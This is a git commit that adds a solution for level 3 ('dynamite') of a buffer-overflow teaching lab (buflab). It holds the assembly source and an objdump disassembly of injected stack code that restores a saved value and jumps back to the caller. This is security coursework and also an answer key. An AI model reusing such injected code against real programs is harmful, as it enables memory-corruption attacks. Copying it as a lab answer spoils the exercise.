434038129a4eead7e48def6aec29e113619c4457
chenjinxian <alanchen1203@gmail.com>
2015-07-07 09:03:52 +0800

    add solution for level3 dynamite

---
+++ buflab/dynamite.d
@@ -0,0 +1,11 @@
+
+dynamite.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:	a1 08 d1 04 08       	mov    0x804d108,%eax
+   5:	a3 b8 35 68 55       	mov    %eax,0x556835b8
+   a:	68 be 8d 04 08       	push   $0x8048dbe
+   f:	c3                   	ret    
---
+++ buflab/dynamite.s
@@ -0,0 +1,4 @@
+mov     0x0804d108,%eax
+mov     %eax,0x556835b8
+push    $0x08048dbe
+ret
